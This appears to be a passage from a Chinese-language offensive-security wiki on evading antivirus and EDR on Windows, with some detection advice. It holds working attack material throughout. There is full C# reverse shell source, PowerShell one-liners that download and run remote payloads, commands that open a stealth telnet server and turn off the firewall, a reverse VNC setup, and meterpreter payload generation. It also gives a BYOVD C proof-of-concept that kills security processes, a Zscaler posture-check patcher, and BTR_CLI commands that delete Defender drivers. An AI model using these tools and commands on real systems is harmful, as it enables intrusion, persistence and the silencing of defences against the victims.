Initialization 会在 `gs:[0xE8]` 中设置一个 sentinel，并调用每个 metadata function。其永久可读的 prologue 会将 function start 记录到 `gs:[0xF0]`，检测 sentinel，并跳过仍处于 clear 状态的 body。随后 epilogue 使用 `call handler`；handler 保存 13 个 registers（`0x68` bytes）后，`[rsp+0x68]` 处的 return address 即为 transformed function 的 end，因此可以将 `end - start` 写入其 metadata record。所有 bodies 完成 masking 后，stub 清除 sentinel，并跳转到 `ImageBase + original_entry_point_RVA`。<sup>[[38]](#references)[[39]](#references)</sup>

在 normal call 期间，prologue 会调用同一个 symmetric handler 来 decode body。最终路径会落入追加的 epilogue，而每个更早的 return 都会直接跳转到共享 handler。normal epilogue 同样使用 `jmp handler` 而非 `call`，因此在 re-masking 后，handler 的 `ret` 会消耗原始 caller 的 return address，并在 `RAX` 中保留 function result。<sup>[[38]](#references)[[39]](#references)</sup>

#### Masking primitive and analysis indicators

Handler 会找到当前 record，跳过固定的 visible prologue（此 build 中为 `0x46` bytes），将其余部分的 protection 修改为 `PAGE_EXECUTE_READWRITE`，逐字节使用 low key byte 进行 XOR，然后将其设置为 `PAGE_EXECUTE_READ`。因此，同一个 loop 会在 entry 时 decode，并在每次 normal exit 时 encode。<sup>[[38]](#references)[[39]](#references)</sup>

该设计的高信号 indicators 包括：<sup>[[38]](#references)[[39]](#references)</sup>

- 位于 executable `.stub` 内的 entry point，以及保存 key 和 relocated `.text` pointers 的 `.funcmet` section；
- pre-CRT 的 PEB、import-table 和 section-table parsing，随后通过每个 metadata pointer 进行 calls；
- 相同的 `call`/`pop` PIC prologues，以及大量 redirect 到同一个 handler 的 return sites；
- 对 `gs:[0xE8]`、`gs:[0xF0]` 和 `gs:[0xF8]` 的 writes，随后是重复的 `VirtualProtect` transitions，以及对 image-backed executable pages 的 bytewise XOR writes。

这属于 memory-scanner evasion，而不是 cryptographic protection：patched file 仍包含原始的 clear body，debugger 可以在 `VirtualProtect` 或 XOR loop 上设置断点，并 dump 当前处于 active 状态的 function。single-byte XOR、可读的 metadata 和固定的 `0x46` boundary 也使 offline recovery 变得直接。<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> PoC 的 TEB slots 是 thread-local 的，但 modified code pages 是 process-wide 的。因此，并发或递归 entry 可能在另一个 invocation 执行期间再次 toggle instructions；exceptions 和 nonlocal exits 也可能绕过 re-masking。健壮的 implementation 必须同步 transitions，恢复通过 `lpflOldProtect` 实际返回的 protection，避免 hard-coded stub lengths，审计 x64 stack alignment 的 `call` 和 `jmp` paths，并在重写 executable bytes 后调用 `FlushInstructionCache`。Microsoft 明确规定，当 executable code 被修改时，caller 负责确保 instruction-cache coherency。<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

你可能在从 internet 下载某些 executables 并执行它们时见过这个 screen。

Microsoft Defender SmartScreen 是一种 security mechanism，旨在保护 end user，避免其运行潜在的 malicious applications。

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen 主要采用基于 reputation 的方式工作，这意味着不常见的 downloaded applications 会触发 SmartScreen，从而 alert 并阻止 end user 执行该 file（不过仍可通过点击 More Info -> Run anyway 执行该 file）。

**MoTW**（Mark of The Web）是一种名为 Zone.Identifier 的 [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>)，在从 internet 下载 files 时会自动创建，并包含其下载来源的 URL。

<figure><img src="../images/image (237).png" alt=""><figcaption><p>检查从 internet 下载的 file 的 Zone.Identifier ADS。</p></figcaption></figure>

> [!TIP]
> 需要注意的是，使用**受信任** signing certificate 签名的 executables **不会触发 SmartScreen**。

防止 payloads 获得 Mark of The Web 的一种非常有效的方法，是将它们打包到某种 container（例如 ISO）中。这是因为 Mark-of-the-Web（MOTW）**无法**应用于**非 NTFS** volumes。

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) 是一个将 payloads 打包到 output containers 中以规避 Mark-of-the-Web 的 tool。

使用示例：
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
以下是通过使用 [PackMyPayload](https://github.com/mgeeky/PackMyPayload/) 将 payload 打包到 ISO 文件中来绕过 SmartScreen 的演示。

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) 是 Windows 中一种强大的日志记录机制，允许应用程序和系统组件**记录事件**。然而，安全产品也可以使用它来监控和检测恶意活动。

类似于禁用（绕过）AMSI，也可以让用户空间进程的 **`EtwEventWrite`** 函数立即返回，而不记录任何事件。具体做法是在内存中 patch 该函数，使其立即返回，从而有效禁用该进程的 ETW 日志记录。

你可以在 **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) 和 [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)** 中找到更多信息。<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

在内存中加载 C# binaries 已经广为人知，并且至今仍然是运行 post-exploitation tools 而不被 AV 发现的非常有效的方法。

由于 payload 将直接加载到内存中而不会接触磁盘，我们只需要考虑为整个进程 patch AMSI。

大多数 C2 frameworks（sliver、Covenant、metasploit、CobaltStrike、Havoc 等）已经提供了直接在内存中执行 C# assemblies 的能力，但实现方式有多种：

- **Fork\&Run**

它会**生成一个新的 sacrificial process**，将 post-exploitation malicious code 注入该新进程，执行 malicious code，并在完成后终止新进程。这种方式既有优点，也有缺点。fork and run 方法的优点是，执行发生在我们的 Beacon implant 进程**之外**。这意味着，如果 post-exploitation 操作出现问题或被发现，我们的 **implant 存活的机会会大得多**。缺点是，被 **Behavioural Detections** 发现的可能性也**更高**。

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

这种方式是将 post-exploitation malicious code 注入**其自身进程**。这样可以避免创建新进程并让 AV 对其进行扫描，但缺点是，如果 payload 执行过程中出现问题，**丢失 beacon** 的可能性会**大得多**，因为它可能导致进程崩溃。

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> 如果你想进一步了解 C# Assembly 加载，请查看这篇文章 [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) 以及它们的 InlineExecute-Assembly BOF（[https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly)）

你也可以**从 PowerShell** 加载 C# Assemblies，请查看 [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) 和 [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk)。

## Using Other Programming Languages

正如 [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) 中所提出的，可以通过让受感染的机器访问**安装在 Attacker Controlled SMB share 上的 interpreter environment**，使用其他语言执行 malicious code。

通过允许访问 SMB share 上的 Interpreter Binaries 和 environment，你可以在受感染机器的**内存中执行这些语言的任意代码**。

该 repo 指出：Defender 仍然会扫描 scripts，但通过使用 Go、Java、PHP 等语言，我们可以**更灵活地绕过 static signatures**。使用这些语言编写的随机、未 obfuscated reverse shell scripts 进行测试已经证明是成功的。

## TokenStomping

Token stomping 会操纵 EDR 或 AV 等安全产品的 access token。降低 token 的权限可以让进程继续运行，同时阻止它执行特权检查或 remediation 操作。

为了防止这种情况，Windows 可以**阻止 external processes** 获取安全进程 token 的 handles。

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

正如[**这篇博客文章**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)所述，只需在受害者的 PC 上部署 Chrome Remote Desktop，然后使用它接管系统并维持 persistence：<sup>[[35]](#references)</sup>
1. 从 https://remotedesktop.google.com/ 下载，点击 "Set up via SSH"，然后点击 Windows 的 MSI 文件以下载 MSI 文件。
2. 在受害者机器上静默运行 installer（需要 admin 权限）：`msiexec /i chromeremotedesktophost.msi /qn`
3. 返回 Chrome Remote Desktop 页面并点击 next。向导随后会要求你进行授权；点击 Authorize 按钮继续。
4. 根据需要调整后执行提供的 command：`"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111`（`--pin` parameter 可以在不使用 GUI 的情况下设置 PIN）。


## Advanced Evasion

Evasion 是一个非常复杂的主题，有时你必须在单个系统中考虑许多不同来源的 telemetry，因此在成熟环境中，想要完全不被发现基本上是不可能的。

你所面对的每个环境都有其自身的优势和弱点。

我强烈建议你观看 [@ATTL4S](https://twitter.com/DaniLJ94) 的这场演讲，以初步了解更多 Advanced Evasion techniques。


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

这也是 [@mariuszbit](https://twitter.com/mariuszbit) 关于 Evasion in Depth 的另一场精彩演讲。


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

你可以使用 [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck)，它会**移除 binary 的部分内容**，直到**找出 Defender** 判定为 malicious 的部分，并将其拆分出来。\
另一个执行**相同操作的 tool 是** [**avred**](https://github.com/dobin/avred)，它还通过 [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) 提供开放的 web service。

### **Telnet Server**

在 Windows10 之前，所有 Windows 都自带一个可以安装的 **Telnet server**（需要 administrator 权限），安装命令如下：
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
使其在系统启动时**启动**并立即**运行**：
```bash
sc config TlntSVR start= auto obj= localsystem
```
**更改 telnet 端口**（stealth）并禁用防火墙：
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

从以下地址下载：[http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html)（需要下载 bin 文件，而不是 setup）

**在主机上**：执行 _**winvnc.exe**_ 并配置服务器：

- 启用选项 _Disable TrayIcon_
- 在 _VNC Password_ 中设置密码
- 在 _View-Only Password_ 中设置密码

然后，将二进制文件 _**winvnc.exe**_ 和**新创建的**文件 _**UltraVNC.ini**_ 移动到**受害者主机**

#### **反向连接**

**攻击者**应在其**主机内**执行二进制文件 `vncviewer.exe -listen 5900`，使其**准备好**接收反向 **VNC connection**。然后，在**受害者主机**内：启动 winvnc daemon `winvnc.exe -run`，并运行 `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**警告：** 为保持隐蔽，不得执行以下操作：

- 如果 `winvnc` 已在运行，不要再次启动，否则会触发一个[弹窗](https://i.imgur.com/1SROTTl.png)。使用 `tasklist | findstr winvnc` 检查其是否正在运行
- 不要在同一目录中没有 `UltraVNC.ini` 的情况下启动 `winvnc`，否则会打开[配置窗口](https://i.imgur.com/rfMQWcf.png)
- 不要运行 `winvnc -h` 获取帮助，否则会触发一个[弹窗](https://i.imgur.com/oc18wcu.png)

### GreatSCT

从以下地址下载：[https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
在 GreatSCT 中：
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
现在使用 `msfconsole -r file.rc` **启动 lister**，并使用以下命令**执行** **xml payload**：
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**当前 Defender 会非常快速地终止该进程。**

### 编译我们自己的 reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### 第一个 C# Revershell

使用以下命令编译：
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
与以下内容一起使用：
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### 使用 C# 编译器
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

自动下载和执行：
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscators 列表：[https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### 使用 Python 构建 injectors 示例：

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### 其他工具
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### 更多

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – 从 Kernel Space 终止 AV/EDR

Storm-2603 利用一个名为 **Antivirus Terminator** 的小型控制台工具，在投放 ransomware 之前禁用 endpoint protections。该工具携带**自有的易受攻击但经过 *signed* 的 driver**，并滥用它执行特权 kernel 操作，甚至 Protected-Process-Light (PPL) AV 服务也无法阻止。<sup>[[12]](#references)</sup>

关键要点
1. **Signed driver**：写入磁盘的文件是 `ServiceMouse.sys`，但其 binary 实际上是来自 Antiy Labs “System In-Depth Analysis Toolkit”的合法 signed driver `AToolsKrnl64.sys`。由于该 driver 带有有效的 Microsoft signature，即使启用了 Driver-Signature-Enforcement (DSE)，它也能加载。
2. **Service installation**：
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
第一行将 driver 注册为 **kernel service**，第二行启动它，使 `\\.\ServiceMouse` 可从 user land 访问。
3. **Driver 暴露的 IOCTL**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | 按 PID 终止任意 process（用于终止 Defender/EDR services） |
| `0x990000D0` | 删除磁盘上的任意 file |
| `0x990001D0` | Unload driver 并移除 service |

最小 C proof-of-concept：
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **为何有效**：BYOVD 完全绕过 user-mode protections；在 kernel 中执行的 code 可以打开 *protected* processes、终止它们，或篡改 kernel objects，不受 PPL/PP、ELAM 或其他 hardening features 的影响。

Detection / Mitigation
• 启用 Microsoft 的 vulnerable-driver block list（`HVCI`、`Smart App Control`），使 Windows 拒绝加载 `AToolsKrnl64.sys`。
• 监控新建 *kernel* services，并在 driver 从 everyone 可写目录加载或不在 allow-list 中时发出警报。
• 监控指向 custom device objects 的 user-mode handles，随后检查可疑的 `DeviceIoControl` calls。

### 通过磁盘上的 Binary Patching 绕过 Zscaler Client Connector Posture Checks

Zscaler 的 **Client Connector** 在本地应用 device-posture rules，并依赖 Windows RPC 将结果传递给其他 components。两个薄弱的设计选择使得完全 bypass 成为可能：

1. Posture evaluation **完全在 client-side 执行**（向 server 发送一个 boolean）。
2. Internal RPC endpoints 仅通过 `WinVerifyTrust` 验证连接 executable 是否由 Zscaler **signed**。<sup>[[11]](#references)</sup>

通过对磁盘上的四个 signed binaries 进行 **patching**，两种机制都可以被 neutralised：

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | 始终返回 `1`，因此每次 check 都符合要求 |
| `ZSAService.exe` | 对 `WinVerifyTrust` 的间接调用 | 被 NOP-ed ⇒ 任意（甚至 unsigned）process 都可以绑定到 RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | 替换为 `mov eax,1 ; ret` |
| `ZSATunnel.exe` | 对 tunnel 的 Integrity checks | 被短路 |

最小 patcher 片段：
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
替换原始文件并重启 service stack 后：

* **所有** posture checks 均显示为 **green/compliant**。
* 未签名或被修改的 binaries 可以打开 named-pipe RPC endpoints（例如 `\\RPC Control\\ZSATrayManager_talk_to_me`）。
* 被攻陷的主机获得由 Zscaler policies 定义的内部网络的 unrestricted access。

此 case study 展示了如何通过几处 byte patches 击败纯 client-side trust decisions 和简单的 signature checks。

## Microsoft Defender `BTR.sys` trusted-functionality abuse

Defender 的 **Boot-Time Removal** driver 是经典 BYOVD 的一个有用反例。`BTR.sys` 是 Microsoft 正式签名的 remediation component，不存在 memory-corruption bug，也没有 IOCTL interface；在获得 administrator access 和 `SeLoadDriverPrivilege` 后，operator 可以伪造其 private remediation transaction，从而获得预期的 Ring-0 file/registry operations。这是一种 **post-compromise AV/EDR-neutralization primitive，而不是 initial access 或 privilege escalation**；此外，driver 可以从目标自身 `MpEngine.dll` 的 `BOOTTIMETOOL` resource 中提取，无需导入显眼的 third-party driver。<sup>[[36]](#references)</sup>

### Staging the one-shot driver

Defender 通常会将 resource 写入随机命名的 `[a-z]{8}.sys` 文件，并注册一个名称类似的 kernel service。`DriverEntry` 读取该 service 的 `Args` value，打开其中引用的 NTFS ADS，解密并验证 action list，写入 feedback，并在成功执行后返回 `0xC0000056`（`STATUS_DELETE_PENDING`），使 driver 卸载而不是继续 resident。伪造的 service 具有以下 characteristic values。<sup>[[36]](#references)[[37]](#references)</sup>
```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```
`:changelist` stream 包含一个经过 RC4 加密的 blob。分析过的 builds 重用了一个固定的 256 字节 key，因此加密并不是 authorization boundary。有效明文包含一个 24 字节的 global header（`Magic=0xFEE1DEAD`、`Version=2`、`PayloadOffset=0x10`、header CRC 以及从 payload 派生的 transaction ID），其后是一个以 null 结尾的 UTF-16 feedback path 和任意数量的 items。每个 item 都包含一个 16 字节 header（`DataSize`、`Action`、`HeaderCRC`、`DataCRC`），以及以 **恰好四个 NUL 字节** 结尾的 action-specific data。每个 header/data 区域都会独立使用 CRC-32 polynomial `0xEDB88320`、初始状态 `0xFFFFFFFF` 且**不进行 final XOR**（`~CRC32`）进行检查；每个区域都会重置 CRC 状态。<sup>[[36]](#references)[[37]](#references)</sup>

已接受的 action IDs 暴露了这些 kernel primitives。<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Item data | Result |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | 删除文件，包括 locked file |
| 2 | `[UTF-16 path]` | 删除空目录 |
| 3 | `[Flags][source][destination]` | 将文件移动到 attacker-selected protected path；空 destination 表示删除 |
| 4 | `[Flags][key path]` | 递归删除 registry key |
| 5 | `[Flags][key path + "\\" + value]` | 删除 registry value |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | 创建/更新 registry value，并创建缺失的 key paths |

对于 actions 5 和 6，on-wire 的 key/value separator 是**两个连续的反斜杠**；按常规格式化的 path 将无法被正确拆分。feedback file 大体上会镜像 request，但每个 item 的前四个 data bytes 会变成其结果 `NTSTATUS`。对于没有 leading flags field 的 actions 1 和 2，BTR 会将 path 移入四个 reserved trailing bytes，以便为该 status 腾出空间。<sup>[[36]](#references)</sup>

### `BTR_CLI` workflow 和 early-boot window

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) 实现了完整链路：从本地 Defender 提取 `BTR.sys`，创建 `<random>.sys:changelist` 和 feedback stream，序列化/checksum/encrypt chained actions，直接创建 service registry key，然后针对 `-trigger now` 调用 `NtLoadDriver`，或针对 `-trigger boot` 将其保留为 system-start driver。直接进行 registry staging 可避开通常的 SCM `CreateServiceW` path，因此**不会**产生 service-install Event ID 7045。之后可以使用 `BTR_CLI.exe -cleanup <service_name>` 移除 boot-triggered artifacts。<sup>[[36]](#references)[[37]](#references)</sup>
```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```
`Start=0` 不可用，因为 BTR 会在存储栈和 `SystemRoot` link 就绪之前，从 `DriverEntry` 执行文件 I/O。`Start=1` 加上高优先级的 `Boot Bus Extender` 组后，会改为在 Phase 1 中执行：此时 NTFS 已可用，但许多 system-start security drivers 和 user-mode EDR services 尚未初始化。诸如 `WdFilter` 之类的 boot-start filters 可能已经加载，但 BTR 可以在下一次启动前删除它们的 binaries 或 service configuration，也可以在 SCM 启动 service executables 之前删除它们。ELAM 无法弥补这一缺口，因为 BTR 在 boot-start evaluation 之后运行，并且携带有效的 Microsoft signature。<sup>[[36]](#references)</sup>

多个操作会在一个 transaction 中执行。PoC 会为硬编码的 `\SystemRoot\Temp\BootClean.log` 添加 Action 1：BTR 创建该 log，随后消耗自身的 delete request，并在卸载前将其删除。这样可以减少 evidence；而将反馈放入 `<random>.sys:<random>.dat` 中，则可以同时删除 driver 和两个 streams。<sup>[[36]](#references)[[37]](#references)</sup>

### High-signal detection correlations

仅依赖 signature 的 rules 和 Microsoft vulnerable-driver blocklist 无法解决对 BTR 预期功能的滥用。应优先使用以下 behavioral correlations，同时区分合法的 Defender lineage 与任意 launcher。<sup>[[36]](#references)</sup>

- **Sysmon 15：** `.sys:changelist` 的创建是 BTR staging 的通用特征。同一个 `.sys` 上附加 `.dat` ADS 尤其可疑，因为合法的 Defender 通常会将反馈放在 `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\` 下。
- **没有 System 7045 的 Sysmon 12/13：** 将 `HKLM\SYSTEM\CurrentControlSet\Services\<random>` 的直接创建与以下内容关联起来：其中包含 `Args=...:changelist` 和 `Group=Boot Bus Extender`，但没有匹配的 SCM installation event。
- **Sysmon 6 -> 23：** 将来自非-Defender lineage 的已知 BTR driver load 与随后归因于 `System`/PID 4 的 file deletion 关联起来，尤其要关注 security binaries。
- **Sysmon 11 -> 23：** 对 `System`/PID 4 快速创建并删除 `\SystemRoot\Temp\BootClean.log` 发出 alert。
- 限制并 audit `SeLoadDriverPrivilege` 的分配和启用；当 security-tool driver 由 `cmd.exe`、PowerShell 或未知 process staging 时，仅有 Microsoft signature 不足以建立信任。

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) 强制实施 signer/level hierarchy，使得只有 protection level 相同或更高的 protected processes 才能相互 tamper。从 offensive 角度来看，如果你能够合法启动一个启用了 PPL 的 binary 并控制其 arguments，就可以将良性功能（例如 logging）转换为受约束的、由 PPL 支持的 write primitive，用于操作 AV/EDR 所使用的 protected directories。<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

使 process 以 PPL 运行的条件
- 目标 EXE（以及所有加载的 DLL）必须使用支持 PPL 的 EKU 签名。
